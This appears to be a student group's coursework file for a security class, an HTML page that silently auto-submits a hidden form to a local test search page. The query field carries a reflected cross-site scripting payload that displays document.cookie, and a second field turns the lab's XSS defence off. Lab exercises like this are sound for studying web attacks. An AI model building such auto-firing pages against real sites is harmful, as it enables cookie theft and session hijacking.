@@ -1,0 +1,21 @@
+<!--
+Group Members: Trent Chismar, Joshua Cominelli, Ryan Brockway
+References: w3schools, class notes, geeksforgeeks
+
+-->
+<html>
+
+    <iframe name="somename", style="display: none"></iframe>
+
+    <form id="thesame", target= "somename" action="http://localhost/project2/search", method="GET", style="display: none">
+        <input name="q" value="<script>alert(document.cookie);</script>">
+        <input name="xssdefense" value="0">
+
+    </form>
+    <script>
+        document.getElementById("thesame").submit();
+
+    </script>
+
+
+</html> 
